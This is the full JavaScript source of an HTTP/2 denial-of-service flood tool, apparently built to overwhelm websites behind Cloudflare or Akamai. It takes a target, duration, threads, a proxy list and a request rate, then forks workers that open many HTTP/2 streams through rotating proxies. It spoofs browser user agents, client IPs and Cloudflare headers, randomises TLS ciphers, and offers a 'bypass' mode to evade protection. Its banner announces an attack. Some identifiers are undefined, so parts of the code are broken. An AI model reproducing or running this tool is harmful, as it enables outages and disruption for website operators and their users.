const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, cluster = require('cluster')
   , axios = require('axios')
   , https = require('https')
   , UserAgent = require('user-agents')
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const os = require('os');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

	

  
var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log('ISP ', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
		 pro =[ 
			{'Methods' : ''},
		    {'Quic-Version' : '0x00000001'},
			
		]
		  val = { 'NEl': Math.random() < 0.5 ? JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}) : JSON.stringify({
	  "success_fraction":0,
      "report_to":Math.random() < 0.5 ? "cf-nel" : 'default',
      "max_age":604800}),
		  }
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
           
	  }
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_128_GCM_SHA256',
		, ]
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}
const blockedDomain = ["https://chinhphu.vn"];
const blocked = [".gov"];
const blocked2 = [".edu"];
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
let query = process.argv[8];

if (target == blockedDomain) {
console.error('erro');
	process.exit(1);
}
if (target.endsWith(blocked)) {
    console.log(` ${blocked} `);
    process.exit(1);
}
if (target.endsWith(blocked2)) {
    console.log(` ${blocked2}`);
    process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
//async function editedline() {
  //try {
    // Code to fetch the proxy list can be added here if required
     //const response = await axios.get('https://daudau.org/api/http.txt');
    //const proxyList = response.data;
    //fs.writeFile('http.txt', proxyList, 'utf8', (error) => {
       //if (error) {
        //console.error('Error:', error);
       //} else {
         //console.log('Success save proxy at http.txt!');
       //}
    //});
  //} catch (error) {
    //console.error(' Error:', error);
  //}
//}

//editedline();


if (cluster.isMaster) {
	console.clear()
	
 
    console.log(" \n Attack Start \n  wanna fuck cloudflare \n HTTP/2 RST v1.0 \n\n   -> Target ( " + target + " ) \n   -> Time ( " + time + " seconds ) \n   -> Threads ( " + thread + " core ) \n   -> Ratelimit ( " + rps + " rq/s ) \n   -> Proxies ( " + proxyFile + " ) \n");
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}


async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 100;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	

	const rateHeaders = [
{ "te" : "trailers"},
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + '/' },
{ "source-ip": randIp  },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
];
const rateHeaders2 = [
{ "dnt": "1"  },
{ "device-memory": "0.25"  },
{ "accept-charset": "UTF-8" },
{"Vary" : randstr(15)},
{"Via" : randstr(15)},
{"X-Forwarded-For" : randomIp},
];

const braveHeaders = {
    'X-Brave-Referrer': Math.random() < 0.3 ? 'https://www.google.com/' : undefined,
    'X-Brave-Vary': Math.random() < 0.3 ? 'Accept-Encoding' : undefined,
    'X-Brave-LastModified': Math.random() < 0.3 ? new Date().toUTCString() : undefined,
  };

     
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const a = getRandomInt(108,131);
const b = getRandomInt(108,128);
const c = getRandomInt(108,129);
const d = getRandomInt(108,131);
const e = getRandomInt(108,127);
var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:${a}.0` : `Linux x86_64`
};



function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 


var uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`
var ua1 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36 Edg/${b}`
var ua2 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Safari/537.36 OPR/${c}`
var uass = `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:${d}.0) Gecko/20100101 Firefox/${d}`

var uasss = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${e}.0.0.0 Safari/537.36 Brave/${e}.0.0.0`
var ch_ua = `"\"Google Chrome\";v=\"${a}\", \"Chromium\";v=\"${a}\", \"Not:A-Brand\";v=\"99\""
`

let ch_ua_v;
    if (randomOS === "Windows NT 10.0") {
        ch_ua_v = `Windows`;
    }
else if (randomOS === "Macintosh") {
        ch_ua_v = `macOSX`;
    }
 else if (randomOS === "X11") {
        ch_ua_v = `Linux`;
    }


const ch_ua_ver = `${ch_ua_v}`;
console.log(uas)
console.log(ch_ua_ver)
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-ZA'
];

const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
];

var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
   hd = {}
     header = {
    ':method': 'GET'
		, ':authority': parsed.host
		, 'x-forwarded-proto':'https'
  };
  if (query === 'true'){
  header[':path'] = Math.random() < 0.5 ? parsed.path + '?cf_chl=' +randstr(5) + '=' + randstr(15) : parsed.path + '?' + 'https://www.gooogle.com/page=' + randstr(5) + '=' + randstr(10) + '?abcxyz=' + randstr(3) + 'GoogleBot' + randstr(2) ;

  }else if (query === 'false'){
	header[':path']=parsed.path;
  }else{
	header[':path']=parsed.path + '?' + randstr(5) + '=' + randstr(20) ;
  }
  

header[':scheme']= 'https';
header['accept-encoding'] = encoding;
header['accept-language'] = lang;
header['accept'] = accept;
header['sec-fetch-mode'] = 'navigate';
header['sec-fetch-dest'] = 'document';
header['sec-fetch-site'] = 'same-origin';
header['sec-fetch-user'] = '?1';
header['cache-control']= Math.random() < 0.5 ? 'no-cache, no-store' : `max-age=0`;
header['upgrade-insecure-requests']= '1';
header['Cf-Cache-Status'] = 'DYNAMIC';
header['Cf-Ray'] = randstr(20) + "-" + randstr(3);
header['Sec-CH-UA'] = ch_ua_ver;
const brw = ['chrome','firefox','edge','macos','linux','brave','opera']
let dynHeaders
let ci
let bruh 
async function rand() {
	var browser = brw[Math.floor(Math.random() * brw.length)]
	if (browser === 'chrome') {
    
	 dynHeaders = {
		...hd[Math.floor(Math.random() * hd.length)], 
		...header,
		'User-Agent':  uas,
		...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
		...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],


		
					  };
					}else if (browser === 'firefox'){
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							'User-Agent':  uass,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],

										  };
					} else if (browser === 'edge') {
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  ua1,

										  };
					} else if (browser === 'linux') {
						dynHeaders = {
							
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 

										  };
					} else if (browser === 'opera') {
						dynHeaders = {
							
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  ua2,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 

                               };
					} else if (browser === 'macos') {
						dynHeaders = {
							...header,
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 

										  };
					} else if (browser === 'brave') {
						dynHeaders = {
							...header,
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							'User-Agent':  uasss,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
                   ...braveHeaders[Math.floor(Math.random() * braveHeaders.length)],

										  };
					} else {
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							'User-Agent':  uas,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],

										  };
					}
					return dynHeaders
	
}
rand()
                
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
		, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
    ,}
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, minVersion: 'TLSv1.2'
    ,maxVersion: 'TLSv1.3'
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
    ,maxRedirects: 20
    ,followAllRedirects: true
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', async function(res, socket) {

		const tlsSocket = await createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        header['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
	const client = await http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {  
       headerTableSize: 65536,
       maxConcurrentStreams: 10000,
       initialWindowSize: 6291456,
       maxHeaderListSize: 262144,
       enablePush: false,      
			},
        
		});
   

		client.on("connect", async () => {
			setInterval(async () => {
		  	for (let i = 0; i < rps; i++) {
  const request = await client.request(dynHeaders);
const request1 = await client.request(dynHeaders);
const request2 = await client.request(dynHeaders); 
const request3 = await client.request(dynHeaders);
  	request.end()
     request1.end()
     request2.end()
     request3.end()
  				}

               
if (streams.length > 0) {
  const streamToReset = streams[0];

  client.rstStream(streamToReset.id, 1);
  return flood()
}
           
       }, interval);
      
    });
		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return flood()
		});

		client.on('timeout', async () => {
		await client.destroy();
		await tlsSocket.destroy();
		await socket.destroy();
		return flood()
		});



client.on("error", async (error) => {
	        if (error){
				await client.destroy();
				await tlsSocket.destroy();
				await socket.destroy();
				 return flood()
			}
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//